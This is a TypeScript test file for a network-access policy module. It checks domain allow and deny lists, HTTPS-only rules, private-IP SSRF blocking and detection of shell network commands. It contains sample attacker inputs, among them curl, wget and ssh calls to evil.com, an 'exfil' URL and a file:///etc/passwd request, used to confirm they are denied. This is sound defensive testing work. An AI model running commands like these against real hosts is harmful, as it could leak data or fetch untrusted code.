import { describe, it, expect } from 'vitest';
import {
    evaluateNetworkAccess,
    evaluateShellNetworkAccess,
    detectShellNetworkCommand,
    isBlockedV4,
    isBlockedV6,
    hostnameResolvesToBlockedIp,
} from '../../src/permissions/network-policy.js';
import type { NetworkPolicy } from '../../src/permissions/network-policy.js';
import type dns from 'node:dns';

// --- Helpers ---

function makePolicy(overrides: Partial<NetworkPolicy> = {}): NetworkPolicy {
    return {
        mode: 'approved-only',
        allowDomains: [],
        denyDomains: [],
        allowHttp: false,
        ...overrides,
    };
}

/**
 * A no-op DNS resolver that always returns a clean public IP.
 * Used for tests that exercise policy logic, not DNS resolution.
 */
function cleanResolver(_host: string, _opts: dns.LookupAllOptions): Promise<dns.LookupAddress[]> {
    return Promise.resolve([{ address: '93.184.216.34', family: 4 }]);
}

/**
 * Build a resolver that always returns the given addresses.
 */
function stubResolver(addresses: dns.LookupAddress[]): (_host: string, _opts: dns.LookupAllOptions) => Promise<dns.LookupAddress[]> {
    return () => Promise.resolve(addresses);
}

// =============================================================================
// evaluateNetworkAccess — URL-based policy evaluation
// =============================================================================

describe('evaluateNetworkAccess', () => {
    // --- Mode: off ---

    it('mode=off → denies all network access', async () => {
        const result = await evaluateNetworkAccess(
            'https://example.com',
            makePolicy({ mode: 'off' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('mode: off');
    });

    it('mode=off → denies even localhost', async () => {
        const result = await evaluateNetworkAccess(
            'https://localhost:3000/api',
            makePolicy({ mode: 'off' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
    });

    // --- Mode: approved-only ---

    it('approved-only, domain in allowDomains → auto-allowed', async () => {
        const result = await evaluateNetworkAccess(
            'https://api.github.com/repos',
            makePolicy({ mode: 'approved-only', allowDomains: ['api.github.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('allowDomains');
    });

    it('approved-only, domain in denyDomains → denied', async () => {
        const result = await evaluateNetworkAccess(
            'https://evil.com/payload',
            makePolicy({ mode: 'approved-only', denyDomains: ['evil.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('denyDomains');
    });

    it('approved-only, unknown domain → requires confirmation', async () => {
        const result = await evaluateNetworkAccess(
            'https://unknown-site.com/page',
            makePolicy({ mode: 'approved-only' }),
            cleanResolver,
        );
        expect(result.decision).toBe('confirm');
        expect(result.reason).toContain('requires approval');
    });

    it('approved-only, wildcard allowDomains → matches subdomain', async () => {
        const result = await evaluateNetworkAccess(
            'https://api.github.com/repos',
            makePolicy({ mode: 'approved-only', allowDomains: ['*.github.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    // --- Mode: open ---

    it('mode=open → allows all domains', async () => {
        const result = await evaluateNetworkAccess(
            'https://anything.com/path',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('open');
    });

    it('mode=open, domain in denyDomains → still denied', async () => {
        const result = await evaluateNetworkAccess(
            'https://evil.com/exfil',
            makePolicy({ mode: 'open', denyDomains: ['evil.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('denyDomains');
    });

    // --- denyDomains precedence ---

    it('domain in both allow and deny → denied (denyDomains precedence)', async () => {
        const result = await evaluateNetworkAccess(
            'https://overlap.com/data',
            makePolicy({
                mode: 'approved-only',
                allowDomains: ['overlap.com'],
                denyDomains: ['overlap.com'],
            }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('denyDomains');
    });

    // --- Localhost exception ---

    it('localhost → auto-allowed in approved-only mode', async () => {
        const result = await evaluateNetworkAccess(
            'https://localhost:3000/api',
            makePolicy({ mode: 'approved-only' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('localhost');
    });

    it('127.0.0.1 → auto-allowed in approved-only mode', async () => {
        const result = await evaluateNetworkAccess(
            'https://127.0.0.1:8080/health',
            makePolicy({ mode: 'approved-only' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('localhost');
    });

    it('::1 → auto-allowed in open mode', async () => {
        const result = await evaluateNetworkAccess(
            'https://[::1]:5432/db',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('localhost');
    });

    it('localhost → auto-allowed even with empty allowDomains', async () => {
        const result = await evaluateNetworkAccess(
            'https://localhost/api',
            makePolicy({ mode: 'approved-only', allowDomains: [] }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    // --- HTTPS-only ---

    it('HTTP URL with allowHttp=false → denied', async () => {
        const result = await evaluateNetworkAccess(
            'http://example.com/data',
            makePolicy({ mode: 'open', allowHttp: false }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('HTTP is not allowed');
    });

    it('HTTP URL with allowHttp=true → allowed', async () => {
        const result = await evaluateNetworkAccess(
            'http://example.com/data',
            makePolicy({ mode: 'open', allowHttp: true }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    it('HTTP localhost → allowed regardless of allowHttp', async () => {
        const result = await evaluateNetworkAccess(
            'http://localhost:3000/api',
            makePolicy({ mode: 'approved-only', allowHttp: false }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    // --- Invalid URL ---

    it('invalid URL → denied', async () => {
        const result = await evaluateNetworkAccess(
            'not-a-url',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('invalid URL');
    });

    // --- Domain glob matching ---

    it('wildcard pattern does not match base domain', async () => {
        const result = await evaluateNetworkAccess(
            'https://github.com/path',
            makePolicy({ mode: 'approved-only', allowDomains: ['*.github.com'] }),
            cleanResolver,
        );
        // *.github.com should NOT match github.com (only subdomains)
        expect(result.decision).toBe('confirm');
    });

    it('wildcard pattern matches one subdomain level', async () => {
        const result = await evaluateNetworkAccess(
            'https://api.github.com/repos',
            makePolicy({ mode: 'approved-only', allowDomains: ['*.github.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    it('case-insensitive domain matching', async () => {
        const result = await evaluateNetworkAccess(
            'https://API.GitHub.COM/repos',
            makePolicy({ mode: 'approved-only', allowDomains: ['api.github.com'] }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
    });

    // --- DNS rebinding / SSRF protection ---

    it('open mode, hostname resolves to 192.168.x.x → denied (SSRF protection)', async () => {
        const result = await evaluateNetworkAccess(
            'https://evil-rebind.com/data',
            makePolicy({ mode: 'open' }),
            stubResolver([{ address: '192.168.1.1', family: 4 }]),
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('private or reserved IP');
    });

    it('open mode, hostname resolves to 10.x.x.x → denied (SSRF protection)', async () => {
        const result = await evaluateNetworkAccess(
            'https://internal.example.com/api',
            makePolicy({ mode: 'open' }),
            stubResolver([{ address: '10.0.0.1', family: 4 }]),
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('private or reserved IP');
    });

    it('open mode, hostname resolves to 172.16.x.x → denied (SSRF protection)', async () => {
        const result = await evaluateNetworkAccess(
            'https://rebind.example.com/',
            makePolicy({ mode: 'open' }),
            stubResolver([{ address: '172.16.0.1', family: 4 }]),
        );
        expect(result.decision).toBe('deny');
    });

    it('open mode, hostname resolves to 169.254.x.x (link-local/metadata) → denied', async () => {
        const result = await evaluateNetworkAccess(
            'https://metadata.example.com/',
            makePolicy({ mode: 'open' }),
            stubResolver([{ address: '169.254.169.254', family: 4 }]),
        );
        expect(result.decision).toBe('deny');
    });

    it('allowDomains, hostname resolves to private IP → denied despite allowDomains', async () => {
        const result = await evaluateNetworkAccess(
            'https://trusted.example.com/',
            makePolicy({ mode: 'approved-only', allowDomains: ['trusted.example.com'] }),
            stubResolver([{ address: '10.10.10.10', family: 4 }]),
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('private or reserved IP');
    });

    it('open mode, hostname resolves to IPv6 ULA → denied', async () => {
        const result = await evaluateNetworkAccess(
            'https://internal6.example.com/',
            makePolicy({ mode: 'open' }),
            stubResolver([{ address: 'fd00::1', family: 6 }]),
        );
        expect(result.decision).toBe('deny');
    });

    it('approved-only + confirm path — DNS check skipped (no allow issued yet)', async () => {
        // 'confirm' should not trigger DNS; resolver should not be called
        let resolverCalled = false;
        const trackingResolver = (host: string, opts: dns.LookupAllOptions) => {
            resolverCalled = true;
            return cleanResolver(host, opts);
        };
        const result = await evaluateNetworkAccess(
            'https://unknown.example.com/',
            makePolicy({ mode: 'approved-only' }),
            trackingResolver,
        );
        expect(result.decision).toBe('confirm');
        expect(resolverCalled).toBe(false);
    });

    it('DNS failure does not block the request (NXDOMAIN is not our concern)', async () => {
        const failingResolver = (): Promise<dns.LookupAddress[]> => Promise.reject(new Error('ENOTFOUND'));
        const result = await evaluateNetworkAccess(
            'https://legit.example.com/',
            makePolicy({ mode: 'open' }),
            failingResolver,
        );
        // DNS failure → hostnameResolvesToBlockedIp returns false → allow proceeds
        expect(result.decision).toBe('allow');
    });
});

// =============================================================================
// isBlockedV4 — CIDR range checks
// =============================================================================

describe('isBlockedV4', () => {
    it('10.0.0.1 → blocked (RFC 1918)', () => expect(isBlockedV4('10.0.0.1')).toBe(true));
    it('10.255.255.255 → blocked (RFC 1918)', () => expect(isBlockedV4('10.255.255.255')).toBe(true));
    it('172.16.0.1 → blocked (RFC 1918)', () => expect(isBlockedV4('172.16.0.1')).toBe(true));
    it('172.31.255.255 → blocked (RFC 1918)', () => expect(isBlockedV4('172.31.255.255')).toBe(true));
    it('172.32.0.1 → NOT blocked (outside /12)', () => expect(isBlockedV4('172.32.0.1')).toBe(false));
    it('192.168.0.1 → blocked (RFC 1918)', () => expect(isBlockedV4('192.168.0.1')).toBe(true));
    it('127.0.0.1 → blocked (loopback)', () => expect(isBlockedV4('127.0.0.1')).toBe(true));
    it('127.255.255.255 → blocked (loopback)', () => expect(isBlockedV4('127.255.255.255')).toBe(true));
    it('169.254.169.254 → blocked (link-local/AWS metadata)', () => expect(isBlockedV4('169.254.169.254')).toBe(true));
    it('100.64.0.1 → blocked (CGNAT)', () => expect(isBlockedV4('100.64.0.1')).toBe(true));
    it('100.127.255.255 → blocked (CGNAT)', () => expect(isBlockedV4('100.127.255.255')).toBe(true));
    it('100.128.0.1 → NOT blocked (outside CGNAT)', () => expect(isBlockedV4('100.128.0.1')).toBe(false));
    it('93.184.216.34 (example.com) → NOT blocked', () => expect(isBlockedV4('93.184.216.34')).toBe(false));
    it('8.8.8.8 (Google DNS) → NOT blocked', () => expect(isBlockedV4('8.8.8.8')).toBe(false));
    it('1.1.1.1 (Cloudflare) → NOT blocked', () => expect(isBlockedV4('1.1.1.1')).toBe(false));
    it('invalid string → NOT blocked (graceful)', () => expect(isBlockedV4('not-an-ip')).toBe(false));
    it('0.0.0.0 → blocked', () => expect(isBlockedV4('0.0.0.0')).toBe(true));
    it('255.255.255.255 → blocked (reserved)', () => expect(isBlockedV4('255.255.255.255')).toBe(true));
    it('224.0.0.1 → blocked (multicast)', () => expect(isBlockedV4('224.0.0.1')).toBe(true));
});

// =============================================================================
// isBlockedV6 — IPv6 blocked range checks
// =============================================================================

describe('isBlockedV6', () => {
    it('::1 → blocked (loopback)', () => expect(isBlockedV6('::1')).toBe(true));
    it('fc00::1 → blocked (ULA)', () => expect(isBlockedV6('fc00::1')).toBe(true));
    it('fd00::1 → blocked (ULA)', () => expect(isBlockedV6('fd00::1')).toBe(true));
    it('fe80::1 → blocked (link-local)', () => expect(isBlockedV6('fe80::1')).toBe(true));
    it('fe8f::1 → blocked (link-local)', () => expect(isBlockedV6('fe8f::1')).toBe(true));
    it('::ffff:192.168.0.1 → blocked (IPv4-mapped private)', () => expect(isBlockedV6('::ffff:192.168.0.1')).toBe(true));
    it('::ffff:8.8.8.8 → NOT blocked (IPv4-mapped public)', () => expect(isBlockedV6('::ffff:8.8.8.8')).toBe(false));
    it('2001:db8::1 (documentation) → NOT blocked by isBlockedV6', () => expect(isBlockedV6('2001:db8::1')).toBe(false));
    it('2606:4700::1 (Cloudflare) → NOT blocked', () => expect(isBlockedV6('2606:4700::1')).toBe(false));
});

// =============================================================================
// hostnameResolvesToBlockedIp
// =============================================================================

describe('hostnameResolvesToBlockedIp', () => {
    it('resolves to private IPv4 → true', async () => {
        const result = await hostnameResolvesToBlockedIp(
            'internal.example.com',
            stubResolver([{ address: '192.168.1.100', family: 4 }]),
        );
        expect(result).toBe(true);
    });

    it('resolves to public IPv4 → false', async () => {
        const result = await hostnameResolvesToBlockedIp(
            'example.com',
            stubResolver([{ address: '93.184.216.34', family: 4 }]),
        );
        expect(result).toBe(false);
    });

    it('resolves to multiple addresses, one private → true', async () => {
        const result = await hostnameResolvesToBlockedIp(
            'mixed.example.com',
            stubResolver([
                { address: '93.184.216.34', family: 4 },
                { address: '10.0.0.1', family: 4 },
            ]),
        );
        expect(result).toBe(true);
    });

    it('DNS failure → false (not our concern)', async () => {
        const result = await hostnameResolvesToBlockedIp(
            'nxdomain.example.com',
            () => Promise.reject(new Error('ENOTFOUND')),
        );
        expect(result).toBe(false);
    });

    it('resolves to IPv6 ULA → true', async () => {
        const result = await hostnameResolvesToBlockedIp(
            'internal6.example.com',
            stubResolver([{ address: 'fd12::1', family: 6 }]),
        );
        expect(result).toBe(true);
    });
});

// =============================================================================
// detectShellNetworkCommand — pattern detection
// =============================================================================

describe('detectShellNetworkCommand', () => {
    it('detects curl with URL', () => {
        const result = detectShellNetworkCommand('curl https://evil.com');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('network_download');
        expect(result.domain).toBe('evil.com');
    });

    it('detects wget with URL', () => {
        const result = detectShellNetworkCommand('wget https://evil.com/file');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('network_download');
        expect(result.domain).toBe('evil.com');
    });

    it('detects ssh with user@host', () => {
        const result = detectShellNetworkCommand('ssh user@host');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('network_access');
        expect(result.domain).toBe('host');
    });

    it('detects git clone with URL', () => {
        const result = detectShellNetworkCommand('git clone https://github.com/repo');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('network_download');
        expect(result.domain).toBe('github.com');
    });

    it('detects npm install', () => {
        const result = detectShellNetworkCommand('npm install package');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('package_install');
    });

    it('detects npm i (shorthand)', () => {
        const result = detectShellNetworkCommand('npm i lodash');
        expect(result.detected).toBe(true);
        expect(result.facet).toBe('package_install');
    });

    it('does not detect non-network commands', () => {
        const result = detectShellNetworkCommand('ls -la');
        expect(result.detected).toBe(false);
    });

    it('does not false-positive on ssh-keygen', () => {
        const result = detectShellNetworkCommand('ssh-keygen -t ed25519');
        expect(result.detected).toBe(false);
    });

    it('curl with flags → still detects domain', () => {
        const result = detectShellNetworkCommand('curl -sL https://example.com/install.sh');
        expect(result.detected).toBe(true);
        expect(result.domain).toBe('example.com');
    });
});

// =============================================================================
// evaluateShellNetworkAccess — shell + policy combined
// =============================================================================

describe('evaluateShellNetworkAccess', () => {
    // --- 5 shell command detection tests (mode=off) ---

    it('curl + mode=off → denied, facet network_download', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://evil.com',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
        expect(result!.facet).toBe('network_download');
    });

    it('wget + mode=off → denied, facet network_download', () => {
        const result = evaluateShellNetworkAccess(
            'wget https://evil.com/file',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
        expect(result!.facet).toBe('network_download');
    });

    it('ssh + mode=off → denied, facet network_access', () => {
        const result = evaluateShellNetworkAccess(
            'ssh user@host',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
        expect(result!.facet).toBe('network_access');
    });

    it('git clone + mode=off → denied, facet network_download', () => {
        const result = evaluateShellNetworkAccess(
            'git clone https://github.com/repo',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
        expect(result!.facet).toBe('network_download');
    });

    it('npm install + mode=off → denied, facet package_install', () => {
        const result = evaluateShellNetworkAccess(
            'npm install package',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
        expect(result!.facet).toBe('package_install');
    });

    // --- Localhost exception does NOT apply to shell detection ---

    it('curl localhost + mode=off → still denied (no localhost exception for shell)', () => {
        const result = evaluateShellNetworkAccess(
            'curl http://localhost:3000/api',
            makePolicy({ mode: 'off' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
    });

    it('curl localhost + mode=approved-only → requires confirmation (no localhost exception)', () => {
        const result = evaluateShellNetworkAccess(
            'curl http://localhost:3000/api',
            makePolicy({ mode: 'approved-only' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('confirm');
    });

    // --- Non-network commands ---

    it('non-network command → returns null', () => {
        const result = evaluateShellNetworkAccess(
            'npm test',
            makePolicy({ mode: 'off' }),
        );
        expect(result).toBeNull();
    });

    // --- Mode: approved-only with domain lists ---

    it('curl to allowed domain + approved-only → allowed', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://api.github.com/repos',
            makePolicy({ mode: 'approved-only', allowDomains: ['api.github.com'] }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('allow');
    });

    it('curl to denied domain + approved-only → denied', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://evil.com/data',
            makePolicy({ mode: 'approved-only', denyDomains: ['evil.com'] }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
    });

    it('curl to unknown domain + approved-only → confirm', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://unknown.com/api',
            makePolicy({ mode: 'approved-only' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('confirm');
    });

    // --- Mode: open ---

    it('curl + mode=open → allowed', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://anything.com/data',
            makePolicy({ mode: 'open' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('allow');
    });

    it('curl + mode=open + denyDomains → denied', () => {
        const result = evaluateShellNetworkAccess(
            'curl https://evil.com/data',
            makePolicy({ mode: 'open', denyDomains: ['evil.com'] }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('deny');
    });

    // --- npm install without extractable domain ---

    it('npm install + approved-only → confirm (no domain to check)', () => {
        const result = evaluateShellNetworkAccess(
            'npm install lodash',
            makePolicy({ mode: 'approved-only' }),
        );
        expect(result).not.toBeNull();
        expect(result!.decision).toBe('confirm');
        expect(result!.facet).toBe('package_install');
    });
});

// =============================================================================
// Consultation fixes — protocol whitelist, localhost range, SSH regex safety
// =============================================================================

describe('consultation fixes', () => {
    // --- Protocol whitelist ---

    it('ftp: protocol → denied', async () => {
        const result = await evaluateNetworkAccess(
            'ftp://evil.com/file',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('protocol');
    });

    it('file: protocol → denied', async () => {
        const result = await evaluateNetworkAccess(
            'file:///etc/passwd',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('protocol');
    });

    it('data: protocol → denied', async () => {
        const result = await evaluateNetworkAccess(
            'data:text/html,<h1>test</h1>',
            makePolicy({ mode: 'open' }),
            cleanResolver,
        );
        expect(result.decision).toBe('deny');
        expect(result.reason).toContain('protocol');
    });

    // --- Expanded localhost detection ---

    it('127.0.0.2 → auto-allowed (loopback range)', async () => {
        const result = await evaluateNetworkAccess(
            'https://127.0.0.2:8080/api',
            makePolicy({ mode: 'approved-only' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('localhost');
    });

    it('::ffff:127.0.0.1 → auto-allowed (IPv4-mapped IPv6)', async () => {
        const result = await evaluateNetworkAccess(
            'https://[::ffff:127.0.0.1]:8080/api',
            makePolicy({ mode: 'approved-only' }),
            cleanResolver,
        );
        expect(result.decision).toBe('allow');
        expect(result.reason).toContain('localhost');
    });

    // --- SSH regex safety ---

    it('ssh with many flags → extracts host without ReDoS', () => {
        const start = performance.now();
        const result = detectShellNetworkCommand(
            'ssh -o StrictHostKeyChecking=no -p 22 user@target.com',
        );
        const elapsed = performance.now() - start;
        expect(result.detected).toBe(true);
        expect(result.domain).toBe('target.com');
        expect(elapsed).toBeLessThan(100);
    });

    it('ssh with quoted options → extracts host', () => {
        const result = detectShellNetworkCommand(
            'ssh -i /path/to/key user@evil.com',
        );
        expect(result.detected).toBe(true);
        expect(result.domain).toBe('evil.com');
    });
});
